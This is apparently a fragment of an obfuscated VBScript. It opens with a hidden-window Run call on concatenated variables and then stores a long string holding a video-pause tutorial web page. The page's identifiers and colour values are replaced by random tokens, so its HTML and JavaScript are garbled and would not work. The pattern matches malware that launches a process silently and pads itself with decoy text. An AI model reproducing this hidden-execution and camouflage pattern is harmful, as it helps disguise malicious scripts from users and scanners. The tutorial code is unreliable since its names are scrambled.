cotransfer.Run ""& graille &"""" & WTlK & """", 0, False

Dim tpsxewfc
tpsxewfc = "                                                " & vbCrLf & _
"                                                <!-- this script is provided by https://www.javascriptfreecode.com coded by: Kerixa Inc. -->" & vbCrLf & _
"" & vbCrLf & _
"<!DOCTYPE html>" & vbCrLf & _
"<html lang=""en"">" & vbCrLf & _
"<head>" & vbCrLf & _
"" & vbCrLf & _
"    <meta charset=""UTF-8"">" & vbCrLf & _
"    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">" & vbCrLf & _
"    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">" & vbCrLf & _
"    <title>Stop and Resume Video when out of viewport</title>" & vbCrLf & _
"" & vbCrLf & _
"<!-- font awesome library include 4.7 -->" & vbCrLf & _
"<link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"" integrity=""sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg=="" crossorigin=""anonymous"" referrerpolicy=""no-referrer"" />" & vbCrLf & _
"" & vbCrLf & _
"<!-- font library -->" & vbCrLf & _
"<link rel=""preconnect"" href=""https://fonts.googleapis.com""><link rel=""preconnect"" href=""https://fonts.gstatic.com"" crossorigin><link href=""https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"" rel=""stylesheet"">" & vbCrLf & _
"" & vbCrLf & _
"<!-- css styles -->" & vbCrLf & _
"<style>" & vbCrLf & _
" " & vbCrLf & _
"@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap'); " & vbCrLf & _
"" & vbCrLf & _
"/* default light theme */" & vbCrLf & _
":root, html{" & vbCrLf & _
"  margin: 0;" & vbCrLf & _
"  padding: 0;" & vbCrLf & _
"  font-family: ""Inter"", arial, monospace;" & vbCrLf & _
"" & vbCrLf & _
"  --primary-color: mgkitbaktkqzbaqf45b69;" & vbCrLf & _
"  --secondary-color:mgkitbaktkqzbaq456990;" & vbCrLf & _
"  --background-color: white;" & vbCrLf & _
"  --button-color: black;" & vbCrLf & _
"  --button-bg-color: yellow;" & vbCrLf & _
"  --opacity: 0.75;" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"/* dark-mode theme */" & vbCrLf & _
":root[data-theme=""dark-mode""]{" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/* main styles */" & vbCrLf & _
"html, body{" & vbCrLf & _
"  height: 200%;" & vbCrLf & _
"  /* background-color: var(--background-color); */" & vbCrLf & _
"  margin: 0;" & vbCrLf & _
"  padding: 0;" & vbCrLf & _
"" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"body{" & vbCrLf & _
"  position: relative;" & vbCrLf & _
"  display: flex;" & vbCrLf & _
"  justify-content: center;" & vbCrLf & _
"  align-items: start;" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"*{" & vbCrLf & _
"  box-sizing: border-box;" & vbCrLf & _
"  font-family: ""Inter"", arial, monospace;" & vbCrLf & _
"  font-size: 1rem;" & vbCrLf & _
"  transition: all 0.5s ease-in-out;" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"a{" & vbCrLf & _
"  text-decoration: none;" & vbCrLf & _
"  font-weight: 600;" & vbCrLf & _
"  color: var(--secondary-color);" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"a:hover{" & vbCrLf & _
"  color: var(--primary-color); " & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"</style>" & vbCrLf & _
"</head>" & vbCrLf & _
"" & vbCrLf & _
"<body>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<main>" & vbCrLf & _
"" & vbCrLf & _
"  <JsdXMhUX width=""640"" height=""360"" controls id=""JsdXMhUX"" loop muted>" & vbCrLf & _
"    <source src=""http://www.javascriptfreecode.com/files/video_player_manipulation_with_intersecting_observer/Water - 33696.mp4"" type=""JsdXMhUX/mp4"">" & vbCrLf & _
"    Your browser does not support the JsdXMhUX tag." & vbCrLf & _
"  </JsdXMhUX>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"</main>" & vbCrLf & _
"" & vbCrLf & _
"  " & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"<script>" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"/*   " & vbCrLf & _
"" & vbCrLf & _
"Tutorial Description" & vbCrLf & _
"" & vbCrLf & _
"A common use case for the Intersection Observer API is to manage a user's experience when viewing JsdXMhUX while interacting with your website. For instant, if the user moves away from the browser window, ideally the JsdXMhUX should pause" & vbCrLf & _
"or resume when the JsdXMhUX is back in the viewport." & vbCrLf & _
"" & vbCrLf & _
"*/" & vbCrLf & _
"" & vbCrLf & _
"window.onload = (event) => {" & vbCrLf & _
"" & vbCrLf & _
"  const JsdXMhUX = document.querySelector(""mgkitbaktkqzbaqzuSWtEId"");" & vbCrLf & _
"" & vbCrLf & _
"  // intersection JsdXMhUX for resuming JsdXMhUX when in viewport or pausing JsdXMhUX otherwise" & vbCrLf & _
"  const JsdXMhUX = document.querySelector(""mgkitbaktkqzbaqzuSWtEId"");" & vbCrLf & _
"" & vbCrLf & _
"  const JsdXMhUX = {" & vbCrLf & _
"    root: null," & vbCrLf & _
"    rootMargin:""0px""," & vbCrLf & _
"    threshold: [0.05, 0.25, 0.5, 0.75, 1]" & vbCrLf & _
"  }" & vbCrLf & _
"" & vbCrLf & _
"  const JsdXMhUX = (entries, JsdXMhUX) => {" & vbCrLf & _
"" & vbCrLf & _
"    entries.forEach(entry => {" & vbCrLf & _
"    " & vbCrLf & _
"      " & vbCrLf & _
"      if(entry.isIntersecting){" & vbCrLf & _
"        " & vbCrLf & _
"        // when the JsdXMhUX is quarter visible, resume JsdXMhUX playback" & vbCrLf & _
"        if(entry.intersectionRatio  >= 0.25){" & vbCrLf & _
"          JsdXMhUX.play();" & vbCrLf & _
"        }" & vbCrLf & _
"      }else{" & vbCrLf & _
"" & vbCrLf & _
"        // when the JsdXMhUX is out of the viewport, pause the JsdXMhUX" & vbCrLf & _
"        if(entry.intersectionRatio <= 0.05){" & vbCrLf & _
"          JsdXMhUX.pause();" & vbCrLf & _
"        }" & vbCrLf & _
"        " & vbCrLf & _
"      }" & vbCrLf & _
"    });" & vbCrLf & _
"  }" & vbCrLf & _
"" & vbCrLf & _
"  const JsdXMhUX = new IntersectionObserver(JsdXMhUX, JsdXMhUX);" & vbCrLf & _
"  JsdXMhUX.observe(JsdXMhUX);" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"" & vbCrLf & _
"</script>" & vbCrLf & _
"</body>" & vbCrLf & _
"</html>                                             " & vbCrLf & _
"                                            <a JsdXMhUX='_blank' href='https://www.javascriptfreecode.com' style='font-size: 8pt; text-decoration: none'>JavaScript Best Codes</a>                                                " & vbCrLf & _
"                                            " & vbCrLf